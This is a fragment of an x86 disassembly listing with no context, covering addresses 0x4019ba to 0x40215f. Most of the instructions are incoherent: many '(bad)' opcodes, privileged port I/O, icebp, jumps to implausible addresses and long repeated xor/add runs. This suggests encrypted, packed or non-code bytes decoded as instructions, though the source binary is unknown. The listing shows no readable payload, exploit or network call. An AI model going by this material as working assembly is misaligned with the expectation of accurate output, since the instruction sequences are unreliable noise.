  4019ba:	add    eax,DWORD PTR [eax]
  4019bc:	xor    ebx,edi
  4019be:	add    eax,DWORD PTR [eax]
  4019c0:	xor    ebx,edi
  4019c2:	add    eax,DWORD PTR [eax]
  4019c4:	xor    ebx,edi
  4019c6:	add    eax,DWORD PTR [eax]
  4019c8:	xor    ebx,edi
  4019ca:	add    eax,DWORD PTR [eax]
  4019cc:	xor    ebx,edi
  4019ce:	add    eax,DWORD PTR [eax]
  4019d0:	xor    ebx,edi
  4019d2:	add    eax,DWORD PTR [eax]
  4019d4:	xor    ebx,edi
  4019d6:	add    eax,DWORD PTR [eax]
  4019d8:	xor    DWORD PTR [ebx+0x4],edi
  4019db:	add    BYTE PTR [ecx],dh
  4019dd:	icebp  
  4019de:	sbb    bh,BYTE PTR [edx+0x9affb2f]
  4019e4:	fstp   TBYTE PTR fs:[ebx+0x25b7fd01]
  4019eb:	push   esp
  4019ec:	fst    DWORD PTR [ebx]
  4019ee:	ja     0x401a10
  4019f0:	shr    esp,0x6a
  4019f3:	addr16 ret 
  4019f5:	fld    TBYTE PTR [eax+0x20]
  4019f8:	xchg   edx,eax
  4019f9:	fsubr  QWORD PTR [ecx+0x6e]
  4019fc:	xchg   esi,eax
  4019fd:	leave  
  4019fe:	and    esp,DWORD PTR [edx-0x6c]
  401a01:	sbb    eax,0x1d877576
  401a06:	ins    DWORD PTR es:[edi],dx
  401a07:	outs   dx,BYTE PTR ds:[esi]
  401a08:	push   ecx
  401a09:	mov    cl,0x4a
  401a0b:	push   ebx
  401a0c:	push   ecx
  401a0d:	shr    BYTE PTR [edx+0x64],1
  401a10:	xchg   esp,eax
  401a11:	out    0x8,eax
  401a13:	or     eax,0x3cd142b
  401a18:	xor    DWORD PTR [ecx+ebp*8],edx
  401a1b:	add    eax,DWORD PTR [eax]
  401a1d:	add    BYTE PTR [ecx],dh
  401a1f:	adc    al,0xb9
  401a21:	inc    eax
  401a22:	xor    DWORD PTR [ebx*4+0x3143204],edx
  401a29:	gs dec ebp
  401a2b:	push   edi
  401a2c:	jmp    0xe9544b34
  401a31:	add    esi,DWORD PTR [ecx]
  401a33:	adc    al,0x9
  401a35:	add    al,0x26
  401a37:	adc    eax,0x223304f2
  401a3c:	jmp    0xe9544c3a
  401a41:	dec    ebp
  401a42:	xor    DWORD PTR [ecx+ebp*8],edx
  401a45:	add    esi,DWORD PTR [ecx]
  401a47:	adc    al,0x55
  401a49:	in     eax,dx
  401a4a:	xor    DWORD PTR [ecx+ebp*8],edx
  401a4d:	adc    esi,DWORD PTR [ecx]
  401a4f:	adc    al,0xe9
  401a51:	adc    esi,DWORD PTR [eax]
  401a53:	adc    al,0xe9
  401a55:	add    esi,ecx
  401a57:	adc    ebp,ecx
  401a59:	adc    esi,DWORD PTR [ecx]
  401a5b:	adc    al,0xe9
  401a5d:	add    eax,0x3ed1431
  401a62:	xor    DWORD PTR [ecx+ebp*8],edx
  401a65:	add    esi,DWORD PTR [ecx]
  401a67:	adc    al,0xed
  401a69:	add    esi,DWORD PTR [ecx]
  401a6b:	adc    al,0xe9
  401a6d:	add    esi,DWORD PTR [ecx]
  401a6f:	adc    al,0xe9
  401a71:	jae    0x401aa3
  401a73:	adc    al,0xe9
  401a75:	add    eax,0xaeb61431
  401a7a:	xor    BYTE PTR [ebx+ebp*8],dl
  401a7d:	add    esi,DWORD PTR [ecx]
  401a7f:	adc    al,0xe9
  401a81:	add    eax,DWORD PTR [eax]
  401a83:	add    BYTE PTR [ecx+0x14],al
  401a86:	jmp    0xe9544b9e
  401a8b:	add    esp,DWORD PTR [ecx]
  401a8d:	adc    al,0xe9
  401a8f:	adc    esi,DWORD PTR [ecx]
  401a91:	adc    al,0x0
  401a93:	jmp    0xd9402eca
  401a98:	xor    dl,BYTE PTR [eax+eax*1]
  401a9b:	jmp    0xe9402ed2
  401aa0:	xor    dl,BYTE PTR [eax+eax*1]
  401aa3:	rol    DWORD PTR [ebx+0x32210015],0x14
  401aaa:	add    cl,ch
  401aac:	xor    dl,BYTE PTR [eax+eax*1]
  401aaf:	jmp    0xe9402ee6
  401ab4:	xor    dl,BYTE PTR [eax+eax*1]
  401ab7:	jmp    0xe9402eee
  401abc:	xor    dl,BYTE PTR [eax+eax*1]
  401abf:	jmp    0xe9402ef6
  401ac4:	xor    dl,BYTE PTR [eax+eax*1]
  401ac7:	jmp    0xe9402efe
  401acc:	xor    dl,BYTE PTR [eax+eax*1]
  401acf:	jmp    0xe9402f06
  401ad4:	xor    dl,BYTE PTR [eax+eax*1]
  401ad7:	jmp    0xe9402f0e
  401adc:	xor    dl,BYTE PTR [eax+eax*1]
  401adf:	jmp    0xe9402f16
  401ae4:	xor    dl,BYTE PTR [eax+eax*1]
  401ae7:	jmp    0x14721aec
  401aec:	add    cl,ch
  401aee:	xor    dl,BYTE PTR [eax+eax*1]
  401af1:	jmp    0xe9402f28
  401af6:	xor    dl,BYTE PTR [eax+eax*1]
  401af9:	jmp    0xe5402f30
  401afe:	mov    edx,DWORD PTR [ebx]
  401b00:	add    BYTE PTR [ebp+0x32],ch
  401b03:	adc    al,0x0
  401b05:	jmp    0xe9402f3c
  401b0a:	xor    dl,BYTE PTR [eax+eax*1]
  401b0d:	add    BYTE PTR [eax],bl
  401b0f:	adc    al,BYTE PTR [eax]
  401b11:	add    BYTE PTR [eax],bl
  401b13:	adc    al,BYTE PTR [eax]
  401b15:	add    BYTE PTR [eax],cl
  401b17:	adc    al,BYTE PTR [eax]
  401b19:	add    BYTE PTR [eax],cl
  401b1b:	adc    al,BYTE PTR [eax]
  401b1d:	add    BYTE PTR [esi],al
  401b1f:	jbe    0x401b86
  401b21:	js     0x401adf
  401b23:	adc    DWORD PTR [eax],eax
  401b25:	add    BYTE PTR [ebx-0x23],dl
  401b28:	add    BYTE PTR [eax],al
  401b2a:	enter  0x1,0x0
  401b2e:	fsubr  st,st(3)
  401b30:	add    BYTE PTR [eax],al
  401b32:	fmul   DWORD PTR [edi]
  401b34:	add    BYTE PTR [eax],al
  401b36:	enter  0x11,0x0
  401b3a:	enter  0x11,0x0
  401b3e:	cwde   
  401b3f:	adc    DWORD PTR [eax],eax
  401b41:	add    BYTE PTR [eax],bh
  401b43:	adc    BYTE PTR [eax],al
  401b45:	pusha  
  401b46:	ss pop esi
  401b48:	fs popa 
  401b4a:	cld    
  401b4b:	jo     0x401b4d
  401b4d:	add    BYTE PTR [eax],al
  401b4f:	add    BYTE PTR [eax-0x67ffffee],bl
  401b55:	add    DWORD PTR [ecx],eax
  401b57:	add    BYTE PTR [eax-0x77fffff1],cl
  401b5d:	adc    DWORD PTR [ecx],eax
  401b5f:	add    BYTE PTR [eax+0x11],bl
  401b62:	add    BYTE PTR [eax],al
  401b64:	pop    eax
  401b65:	adc    DWORD PTR [eax],eax
  401b67:	add    BYTE PTR [eax+0x11],cl
  401b6a:	add    BYTE PTR [eax],al
  401b6c:	or     BYTE PTR [eax],dl
  401b6e:	add    BYTE PTR [eax+0x66],al
  401b71:	inc    ebp
  401b72:	popa   
  401b73:	je     0x401bae
  401b75:	adc    BYTE PTR [eax],al
  401b77:	add    BYTE PTR [eax+0x48000053],dl
  401b7d:	xor    DWORD PTR [ecx],eax
  401b7f:	add    BYTE PTR [eax],bl
  401b81:	dec    edi
  401b82:	add    BYTE PTR [eax],al
  401b84:	sbb    BYTE PTR [edi],cl
  401b86:	add    DWORD PTR [eax],eax
  401b88:	xor    ebx,edi
  401b8a:	add    eax,DWORD PTR [eax]
  401b8c:	xor    ebx,edi
  401b8e:	add    eax,DWORD PTR [eax]
  401b90:	xor    ebx,edi
  401b92:	add    eax,DWORD PTR [eax]
  401b94:	xor    DWORD PTR [ebx-0x50efffd],edi
  401b9a:	add    eax,DWORD PTR [eax]
  401b9c:	xor    ebx,edi
  401b9e:	add    eax,DWORD PTR [eax]
  401ba0:	xor    ebx,edi
  401ba2:	add    eax,DWORD PTR [eax]
  401ba4:	xor    ebx,edi
  401ba6:	add    eax,DWORD PTR [eax]
  401ba8:	xor    DWORD PTR [eax-0x37b61374],ebp
  401bae:	adc    eax,DWORD PTR [eax+0x31]
  401bb1:	adc    esi,DWORD PTR [ebp+0x1]
  401bb4:	add    BYTE PTR [eax],al
  401bb6:	repnz in eax,0xf7
  401bb9:	jne    0x401be4
  401bbb:	xchg   ecx,eax
  401bbc:	add    ch,BYTE PTR [edx+0x31]
  401bbf:	adc    edi,DWORD PTR [edx+ebx*8-0x3d3304cf]
  401bc6:	sub    eax,0x8d8b50fb
  401bcb:	push   edx
  401bcc:	sub    dl,BYTE PTR [eax]
  401bce:	icebp  
  401bcf:	cli    
  401bd0:	sti    
  401bd1:	jb     0x401c03
  401bd3:	mov    edx,0xe30483f7
  401bd8:	add    esi,DWORD PTR [edx+ebp*1+0x72]
  401bdc:	push   ecx
  401bdd:	or     BYTE PTR [edx+0x3975f6c8],ch
  401be3:	scas   al,BYTE PTR es:[edi]
  401be4:	push   edx
  401be5:	or     BYTE PTR [eax-0x48],bh
  401be8:	add    BYTE PTR [eax],al
  401bea:	add    al,0x72
  401bec:	call   0x6cc28974
  401bf1:	dec    edi
  401bf2:	and    DWORD PTR [ebx],edi
  401bf4:	add    al,0xf8
  401bf6:	ret    
  401bf7:	sti    
  401bf8:	ret    0x3eff
  401bfb:	out    0x7,eax
  401bfd:	(bad)  
  401bfe:	in     al,dx
  401bff:	bound  edi,QWORD PTR [edi-0x16ead2bb]
  401c05:	add    esi,DWORD PTR [ecx]
  401c07:	adc    al,0x72
  401c09:	push   ecx
  401c0a:	sub    DWORD PTR [edi-0x1cce9605],ecx
  401c10:	aam    0x13
  401c12:	push   cs
  401c13:	push   0x45
  401c15:	idiv   DWORD PTR [esp+ebx*8+0x3e]
  401c19:	jno    0x401c1b
  401c1b:	add    BYTE PTR [ecx],ch
  401c1d:	jecxz  0x401bba
  401c1f:	psubsb mm2,mm6
  401c22:	fld    QWORD PTR [ebx]
  401c24:	test   BYTE PTR [edi-0x23127ceb],cl
  401c2a:	xchg   ecx,eax
  401c2b:	jge    0x401c6e
  401c2d:	push   esp
  401c2e:	jmp    0x2a55802e
  401c33:	div    esi
  401c35:	pop    ecx
  401c36:	add    DWORD PTR [ecx+esi*1],eax
  401c39:	adc    al,0xe9
  401c3b:	mov    esi,0x3e9e074
  401c40:	xor    DWORD PTR [edx+eiz*2],edx
  401c43:	push   ecx
  401c44:	cmp    DWORD PTR [edi-0x24137705],ecx
  401c4a:	cmp    DWORD PTR [edx+0x33],ebp
  401c4d:	jecxz  0x401cab
  401c4f:	clc    
  401c50:	xchg   esi,eax
  401c51:	imul   edx,ecx,0xc60c04f6
  401c57:	push   ecx
  401c58:	sbb    eax,0x68fc248f
  401c5d:	(bad)  
  401c5e:	in     eax,dx
  401c5f:	add    ebx,esp
  401c61:	mov    ?,WORD PTR [ebp+0x11dc7582]
  401c67:	ret    0x5441
  401c6a:	jmp    0xaa55006a
  401c6f:	imul   BYTE PTR [esi+0x59]
  401c72:	xchg   ecx,eax
  401c73:	add    esi,DWORD PTR [ecx]
  401c75:	adc    al,0xe9
  401c77:	mov    esi,0x3e9dfec
  401c7c:	xor    DWORD PTR [eax+eax*1],edx
  401c7f:	bound  eax,QWORD PTR [eax]
  401c81:	add    cl,ah
  401c83:	or     ecx,DWORD PTR [ebx-0x7a74625]
  401c89:	mov    ecx,0xd4ff1598
  401c8e:	es jecxz 0x401d06
  401c91:	push   ecx
  401c92:	pop    ds
  401c93:	imul   ecx,DWORD PTR [eax],0xff08604e
  401c99:	mov    esp,0x3e87ec3a
  401c9e:	pop    es
  401c9f:	jecxz  0x401cf1
  401ca1:	bound  esp,QWORD PTR [ecx+0xc]
  401ca4:	mov    ebx,ebx
  401ca6:	pop    eax
  401ca7:	adc    al,0x6a
  401ca9:	jmp    0x1f3c858d
  401cae:	popa   
  401caf:	fdiv   st(7),st
  401cb1:	pushf  
  401cb2:	sub    ah,bl
  401cb4:	push   edx
  401cb5:	cmc    
  401cb6:	push   0xffffff8f
  401cb8:	push   ebp
  401cb9:	add    DWORD PTR [ebx],esi
  401cbb:	dec    ecx
  401cbc:	or     al,0xc2
  401cbe:	loop   0x401d29
  401cc0:	push   es
  401cc1:	ret    0xccf2
  401cc4:	ret    0x32e1
  401cc7:	pushf  
  401cc8:	add    ecx,ebp
  401cca:	xor    dl,BYTE PTR [ecx+ecx*8]
  401ccd:	stos   DWORD PTR es:[edi],eax
  401cce:	sub    eax,0x89625514
  401cd3:	xchg   esi,eax
  401cd4:	(bad)  
  401cd5:	int    0x1d
  401cd7:	xor    edx,DWORD PTR [ecx]
  401cd9:	sub    DWORD PTR ds:0x71e872dc,ebp
  401cdf:	loop   0x401ce0
  401ce1:	cmp    al,0x1d
  401ce3:	jecxz  0x401d5a
  401ce5:	loope  0x401ce7
  401ce7:	add    BYTE PTR [edx+0x5b],bl
  401cea:	jmp    DWORD PTR [esi+0x14c00e5c]
  401cf0:	xor    ebp,ecx
  401cf2:	ret    0x32e5
  401cf5:	(bad)  
  401cf6:	push   ebp
  401cf7:	loope  0x401cb2
  401cf9:	add    eax,0xdc15008d
  401cfe:	push   eax
  401cff:	inc    DWORD PTR [ebp+0x6]
  401d02:	push   DWORD PTR [ebp+0x4c]
  401d05:	out    0x75,eax
  401d07:	or     BYTE PTR [edi+0x58850c46],bl
  401d0d:	pusha  
  401d0e:	adc    ecx,DWORD PTR [ebx+0x453be9d5]
  401d14:	sbb    BYTE PTR [ebx+0x7],dh
  401d17:	mov    eax,0x1619
  401d1c:	arpl   dx,sp
  401d1e:	sub    al,al
  401d20:	arpl   WORD PTR [esi],dx
  401d22:	sub    eax,eax
  401d24:	push   ecx
  401d25:	(bad)  
  401d26:	or     al,0x0
  401d28:	lds    ecx,FWORD PTR [esp+ebp*8+0x56dc1483]
  401d2f:	push   0x400555
  401d34:	inc    eax
  401d35:	add    bx,ax
  401d38:	aas    
  401d39:	xchg   ebx,eax
  401d3a:	jge    0x401d48
  401d3c:	fdiv   DWORD PTR [ecx+0x6]
  401d3f:	cmp    DWORD PTR ds:0xc775000d,0x2c
  401d46:	rcr    BYTE PTR [esi+0x51],0xd6
  401d4a:	or     al,0x0
  401d4c:	add    BYTE PTR [eax],al
  401d4e:	sbb    ebp,DWORD PTR [edx+0x10]
  401d51:	add    BYTE PTR ds:0x8801b80e,al
  401d57:	adc    eax,0xd3d15e00
  401d5c:	or     al,0x0
  401d5e:	add    esi,DWORD PTR [edx+0xc]
  401d61:	(bad)  
  401d62:	push   ebp
  401d63:	fadd   QWORD PTR [eax]
  401d65:	add    BYTE PTR [eax+0x50558b15],cl
  401d6b:	mov    WORD PTR [edx],ss
  401d6d:	lea    edx,ds:0x45ff50dc
  401d73:	or     BYTE PTR [esi-0x1],dl
  401d76:	xor    DWORD PTR [eax],eax
  401d78:	or     al,0xff
  401d7a:	jecxz  0x401d56
  401d7c:	jle    0x401d3e
  401d7e:	enter  0x28f1,0xc0
  401d82:	fbld   TBYTE PTR [ebx+0x6e310cc1]
  401d88:	jbe    0x401d86
  401d8a:	xor    eax,ebp
  401d8c:	cld    
  401d8d:	sub    dh,cl
  401d8f:	fmul   st,st(2)
  401d91:	ret    0xeb2d
  401d94:	mov    BYTE PTR [ebp+0x15],al
  401d97:	out    dx,al
  401d98:	repz sub DWORD PTR [ebx+ebx*8+0x6e],esi
  401d9d:	(bad)  
  401d9e:	leave  
  401d9f:	jmp    0x401da4
  401da1:	add    BYTE PTR [ecx],dh
  401da3:	or     edx,0x4eeb25c2
  401da9:	mov    ebx,ebp
  401dab:	imul   edi,DWORD PTR [edi-0xbc62908],0x68
  401db2:	add    BYTE PTR [eax],al
  401db4:	xor    eax,0xd90043dd
  401db9:	jl     0x401dbd
  401dbb:	ret    
  401dbc:	into   
  401dbd:	xchg   esp,eax
  401dbe:	add    ebp,DWORD PTR [edx+0x31]
  401dc1:	test   DWORD PTR [eax],eax
  401dc3:	push   0x31
  401dc5:	test   DWORD PTR [eax],eax
  401dc7:	push   0x8003eb31
  401dcc:	scas   al,BYTE PTR es:[edi]
  401dcd:	addr16 or ebp,eax
  401dd0:	mov    al,0xa1
  401dd2:	add    al,0x0
  401dd4:	test   al,0x37
  401dd6:	lock inc eax
  401dd8:	sbb    al,0xef
  401dda:	mov    esp,0x5deb39c2
  401ddf:	add    BYTE PTR [edi+ebp*1-0x14f6af14],dh
  401de6:	adc    eax,DWORD PTR [eax]
  401de8:	xor    DWORD PTR [eax-0x77],edi
  401deb:	clc    
  401dec:	pop    esi
  401ded:	mov    cl,0xf3
  401def:	push   eax
  401df0:	adc    bx,WORD PTR [eax+esi*8]
  401df4:	dec    ecx
  401df5:	je     0x401dad
  401df7:	add    al,0x31
  401df9:	or     eax,0xe13f79a9
  401dfe:	adc    al,0xf0
  401e00:	pop    ecx
  401e01:	ds sahf 
  401e03:	add    al,0x31
  401e05:	sub    eax,0xb73bda9
  401e0a:	jmp    0x5d1cc301
  401e0f:	mov    DWORD PTR [ecx],ebp
  401e11:	lock repz sbb di,0xffd4
  401e18:	add    BYTE PTR [eax],al
  401e1a:	push   cs
  401e1b:	push   es
  401e1c:	push   esi
  401e1d:	repz push cs
  401e1f:	xchg   esp,eax
  401e20:	int3   
  401e21:	jmp    0x401e54
  401e23:	imul   eax,DWORD PTR [ebp+0x51e084f3],0xe914de3b
  401e2d:	stos   DWORD PTR es:[edi],eax
  401e2e:	xor    BYTE PTR [ecx+ebp*8],dl
  401e31:	add    edi,eax
  401e33:	shl    cl,cl
  401e35:	add    eax,DWORD PTR [ebx+ecx*4+0x2ae5c0d]
  401e3c:	test   eax,0xe862c903
  401e41:	mov    dh,0x6a
  401e44:	jmp    0x401ea3
  401e46:	xor    edi,ebx
  401e48:	je     0x401e45
  401e4a:	into   
  401e4b:	mov    al,0xf4
  401e4d:	repnz scas al,BYTE PTR es:[edi]
  401e4f:	int    0x2b
  401e51:	or     BYTE PTR [ecx],dh
  401e53:	dec    ecx
  401e54:	jb     0x401e35
  401e56:	or     DWORD PTR [eax-0x23cebc05],edi
  401e5c:	pop    ebx
  401e5d:	add    eax,0x443df72
  401e62:	sbb    edx,DWORD PTR [esi+eax*8]
  401e65:	js     0x401e90
  401e67:	in     al,dx
  401e68:	outs   dx,BYTE PTR ds:[esi]
  401e69:	lock jbe 0x401e4b
  401e6c:	add    BYTE PTR [eax+0x14001874],ah
  401e72:	out    0xef,al
  401e74:	sub    DWORD PTR [ebp-0x43b93b6],0xfffffff2
  401e7b:	adc    edi,eax
  401e7d:	sbb    eax,DWORD PTR [eax]
  401e7f:	add    BYTE PTR [ebx+edx*8],dh
  401e82:	dec    DWORD PTR [esi+0x2c8f0fc9]
  401e88:	dec    ebp
  401e89:	xlat   BYTE PTR ds:[ebx]
  401e8a:	inc    ebp
  401e8b:	jge    0x401ebf
  401e8d:	adc    al,0x0
  401e8f:	jmp    0xf53f3320
  401e94:	fidiv  WORD PTR es:[ebp-0xf]
  401e98:	cli    
  401e99:	je     0x401e98
  401e9b:	pop    esi
  401e9c:	and    ecx,DWORD PTR [ebx+0x28fe155]
  401ea2:	call   esp
  401ea4:	push   ss
  401ea5:	fbstp  TBYTE PTR [ebp+0x41]
  401ea8:	add    ebp,DWORD PTR [ecx+0x8]
  401eab:	ds pop esp
  401ead:	cld    
  401eae:	enter  0xea2b,0xde
  401eb2:	push   esp
  401eb3:	bound  eax,QWORD PTR [esi]
  401eb5:	ins    BYTE PTR es:[edi],dx
  401eb6:	add    dl,bh
  401eb8:	jb     0x401ece
  401eba:	clc    
  401ebb:	fwait
  401ebc:	sub    eax,0x3283ffd3
  401ec1:	fbstp  TBYTE PTR [ebp-0x1f]
  401ec4:	jmp    0xc2cc:0xc306ffa9
  401ecb:	in     eax,0x32
  401ecd:	dec    ecx
  401ece:	mov    eax,DWORD PTR ds:0x6a14492f
  401ed4:	push   esp
  401ed5:	adc    al,0x75
  401ed7:	in     eax,dx
  401ed8:	fcmovnbe st,st(1)
  401eda:	adc    cl,ch
  401edc:	mov    eax,ds:0x6d61068
  401ee1:	adc    bh,bh
  401ee3:	push   esp
  401ee4:	add    BYTE PTR [eax],al
  401ee6:	test   esi,esi
  401ee8:	hlt    
  401ee9:	add    BYTE PTR [ebp-0x1c],dh
  401eec:	dec    DWORD PTR [ebx+0x220fc1d]
  401ef2:	xchg   ecx,eax
  401ef3:	aad    0x10
  401ef5:	add    BYTE PTR ds:0x8c83ec61,bh
  401efb:	jecxz  0x401efc
  401efd:	jne    0x401f43
  401eff:	inc    eax
  401f00:	add    al,0x8d
  401f02:	sbb    eax,0x1dff50e4
  401f07:	loopne 0x401ef0
  401f09:	ret    
  401f0a:	mov    bh,0xe4
  401f0c:	dec    DWORD PTR [ebx+0x3883140d]
  401f12:	sbb    BYTE PTR [esi+0x7],ah
  401f15:	mov    ecx,DWORD PTR [ebp-0x1c]
  401f18:	bswap  eax
  401f1a:	adc    DWORD PTR [esi],0x2b
  401f1d:	shl    BYTE PTR [ecx-0x2a],0x8
  401f21:	add    ch,cl
  401f23:	pusha  
  401f24:	in     al,dx
  401f25:	or     DWORD PTR [esp+eiz*8-0x1],0x75
  401f2a:	add    al,0x40
  401f2c:	add    cl,BYTE PTR [ebp-0xaf1c33]
  401f32:	lods   eax,DWORD PTR ds:[esi]
  401f33:	(bad)  
  401f35:	xchg   edi,eax
  401f36:	pop    ss
  401f37:	jecxz  0x401f38
  401f39:	mov    ecx,DWORD PTR [ebp-0x37c77d23]
  401f3f:	or     BYTE PTR gs:[edi],cl
  401f42:	outs   dx,DWORD PTR ds:[esi]
  401f43:	push   ebp
  401f44:	inc    BYTE PTR [esi+0x2b02bf0c]
  401f4a:	add    BYTE PTR [eax],al
  401f4c:	or     BYTE PTR [ecx+0x46c808c2],bl
  401f52:	mov    ebp,esp
  401f54:	sbb    ecx,esp
  401f56:	cld    
  401f57:	call   FWORD PTR ds:0x250169dd
  401f5d:	push   esi
  401f5e:	call   DWORD PTR [eax+0x77]
  401f61:	data16 or al,ch
  401f64:	xor    DWORD PTR [ecx-0xf],edx
  401f67:	inc    DWORD PTR [esi-0x4df3b98e]
  401f6d:	adc    eax,DWORD PTR [esp+esi*2]
  401f70:	das    
  401f71:	out    dx,al
  401f72:	mov    ecx,0x5d26e45
  401f77:	sub    esi,DWORD PTR [ecx-0x4c]
  401f7a:	lds    ecx,FWORD PTR [eax]
  401f7c:	xor    DWORD PTR [eax],esp
  401f7e:	jge    0x401f6c
  401f80:	stos   BYTE PTR es:[edi],al
  401f81:	sub    BYTE PTR [ebx+eax*4],dl
  401f84:	or     ebp,ebx
  401f86:	jbe    0x401f8c
  401f88:	js     0x401f33
  401f8a:	(bad)  
  401f8b:	(bad)  
  401f8c:	aas    
  401f8d:	loopne 0x401f8e
  401f8f:	(bad)  
  401f90:	mov    esp,0x2de0dbe2
  401f95:	lock or si,cx
  401f99:	out    0xfc,eax
  401f9b:	mov    al,BYTE PTR [ebx+ebx*8-0x14cefd38]
  401fa2:	add    eax,DWORD PTR [eax]
  401fa4:	sbb    bh,al
  401fa6:	pop    ebp
  401fa7:	add    DWORD PTR [esi],eax
  401fa9:	enter  0xfeff,0x84
  401fad:	jecxz  0x401f8a
  401faf:	push   ecx
  401fb0:	add    BYTE PTR [eax],al
  401fb2:	cmc    
  401fb3:	sbb    eax,0xf6f3c9f0
  401fb8:	add    edx,DWORD PTR [ebp-0x46]
  401fbb:	push   ds
  401fbc:	test   ah,al
  401fbe:	fstp   QWORD PTR [esp+edi*2+0x3812575]
  401fc5:	lea    esi,[edi+eax*1+0x53]
  401fc9:	(bad)  
  401fca:	cmp    al,0xdb
  401fcc:	pop    ecx
  401fcd:	inc    DWORD PTR [ebx+eiz*8-0x25]
  401fd1:	mov    al,ds:0xb03eadc
  401fd6:	jno    0x402036
  401fd8:	or     DWORD PTR [ebx+0x7502ef24],eax
  401fde:	ss adc al,0x12
  401fe1:	(bad)  
  401fe2:	test   edx,0x893100ab
  401fe8:	sub    al,0xf0
  401fea:	xor    ah,ah
  401fec:	add    BYTE PTR [ecx+0x21],cl
  401fef:	addr16 call 0xf03:0xe91430ac
  401ff7:	retf   
  401ff8:	stos   DWORD PTR es:[edi],eax
  401ff9:	add    BYTE PTR [ecx],dh
  401ffb:	inc    edi
  401ffc:	(bad)  
  401ffd:	loopne 0x401faf
  401fff:	xlat   BYTE PTR ds:[ebx]
  402000:	and    edi,ebp
  402002:	push   esi
  402003:	fdivr  QWORD PTR [edx]
  402005:	sbb    ebp,DWORD PTR [edx+0x69]
  402008:	jmp    0xebaa5166
  40200d:	pop    ecx
  40200e:	xor    DWORD PTR [edx-0x16],ebp
  402011:	pop    ebx
  402012:	xor    DWORD PTR [ecx+ebp*8],edx
  402015:	ret    
  402016:	add    BYTE PTR [eax],al
  402018:	cs (bad) 
  40201a:	in     eax,0xdb
  40201c:	outs   dx,DWORD PTR ds:[esi]
  40201d:	shr    ecx,0x3
  402020:	test   al,0x51
  402022:	gs inc esp
  402024:	popf   
  402025:	inc    edi
  402026:	pop    esi
  402027:	jns    0x402062
  402029:	in     al,dx
  40202a:	sbb    ch,dh
  40202c:	push   es
  40202d:	fsub   QWORD PTR [esi]
  40202f:	dec    ecx
  402030:	stc    
  402031:	adc    al,0xe9
  402033:	add    esi,DWORD PTR [ecx]
  402035:	(bad)  
  402036:	xchg   esp,eax
  402037:	sti    
  402038:	mov    ebx,0xe9496406
  40203d:	inc    esp
  40203e:	rol    DWORD PTR [ebx-0x7f16ebcf],0xac
  402045:	pop    esp
  402046:	push   ds
  402047:	out    dx,eax
  402048:	into   
  402049:	inc    esp
  40204a:	push   ss
  40204b:	jns    0x402086
  40204d:	fstp   TBYTE PTR [ebx+0x159b3ff]
  402053:	add    al,0x3c
  402055:	pop    ss
  402056:	stos   BYTE PTR es:[edi],al
  402057:	fimul  DWORD PTR [ecx-0x25]
  40205a:	add    BYTE PTR [edx+ebx*4-0x77],bh
  40205e:	test   DWORD PTR [ecx-0x71],esi
  402061:	(bad)  
  402063:	cmp    DWORD PTR [esi-0x1a2e039f],eax
  402069:	(bad)  
  40206b:	(bad)  
  40206c:	mov    ebx,DWORD PTR [ebx-0x66a4148c]
  402072:	(bad)  
  402073:	cmp    al,0x81
  402075:	in     al,dx
  402076:	stc    
  402077:	xchg   ebp,eax
  402078:	xor    dl,BYTE PTR [ebx+ecx*4]
  40207b:	stos   BYTE PTR es:[edi],al
  40207c:	add    BYTE PTR [eax],al
  40207e:	sti    
  40207f:	int3   
  402080:	ret    0x32e1
  402083:	inc    ecx
  402084:	mov    edx,DWORD PTR [ebp-0x61072f4d]
  40208a:	leave  
  40208b:	pop    es
  40208c:	call   0x1b7bec
  402091:	pusha  
  402092:	jmp    0x416ce872
  402097:	adc    al,0x0
  402099:	jmp    0xe5b5fbd0
  40209e:	or     dl,ch
  4020a0:	std    
  4020a1:	outs   dx,BYTE PTR ds:[esi]
  4020a2:	jg     0x6dc15fd
  4020a8:	push   0xffffffe9
  4020aa:	push   0x16dcff14
  4020af:	(bad)  [ebp+0x51]
  4020b2:	punpcklwd mm1,DWORD PTR [eax]
  4020b5:	inc    esi
  4020b6:	jns    0x4020c0
  4020b8:	call   FWORD PTR [ebx-0x1e3d32c2]
  4020be:	xor    al,BYTE PTR [ecx-0x75]
  4020c1:	cmp    eax,0x2ef8cfb3
  4020c6:	imul   ebx,esp,0x1432e900
  4020cc:	(bad)  
  4020cd:	lods   al,BYTE PTR ds:[esi]
  4020ce:	(bad)  
  4020cf:	adc    eax,DWORD PTR [eax]
  4020d1:	jmp    0x95b008
  4020d6:	rcr    BYTE PTR [ebp+0x12],0x8d
  4020da:	aad    0xee
  4020dc:	push   eax
  4020dd:	push   0xffffff99
  4020df:	jmp    0x411d59
  4020e4:	(bad)  
  4020e5:	(bad)  
  4020e6:	clc    
  4020e7:	push   ebp
  4020e9:	xlat   BYTE PTR ds:[ebx]
  4020ea:	(bad)  
  4020eb:	push   edx
  4020ec:	test   BYTE PTR [ebx+0x45],bl
  4020ef:	clc    
  4020f0:	rcl    ebp,1
  4020f2:	add    al,0x0
  4020f4:	inc    ebp
  4020f5:	pop    ebp
  4020f6:	in     al,dx
  4020f7:	push   0xffffff89
  4020f9:	pop    ecx
  4020fa:	inc    ebp
  4020fb:	or     al,0x48
  4020fd:	jmp    0x28b02977
  402102:	cld    
  402103:	dec    DWORD PTR [edi+0x4808c29e]
  402109:	inc    ecx
  40210a:	mov    ebp,esp
  40210c:	and    cl,BYTE PTR [ecx*4-0xb9b3bb]
  402113:	jne    0x402165
  402115:	mov    esi,0xe8affc2a
  40211a:	leave  
  40211b:	ret    0x1620
  40211e:	push   ebp
  40211f:	mov    ebp,DWORD PTR [ebx+edx*4+0x62080c7d]
  402126:	adc    al,0x83
  402128:	or     eax,0x1e740006
  40212d:	jmp    0x619f31a7
  402132:	or     al,0xff
  402134:	in     eax,0xdd
  402136:	out    0x9,eax
  402138:	ins    BYTE PTR es:[edi],dx
  402139:	out    0xff,eax
  40213b:	leave  
  40213c:	sbb    dl,BYTE PTR [eax+eax*1]
  40213f:	push   ebp
  402140:	push   ebx
  402141:	hlt    
  402142:	push   DWORD PTR [ebp-0x8]
  402145:	call   0x4029bf
  40214a:	inc    eax
  40214b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40214c:	(bad)  
  40214d:	jmp    FWORD PTR [edi]
  40214f:	xchg   ebx,eax
  402150:	jge    0x402162
  402152:	xor    ebx,ebp
  402154:	ja     0x40216a
  402156:	mov    dl,0x88
  402158:	(bad)  
  402159:	inc    DWORD PTR [edx-0x1f]
  40215c:	in     al,dx
  40215d:	jne    0x4021a0
  40215f:	fidiv  DWORD PTR [esi+0xc]
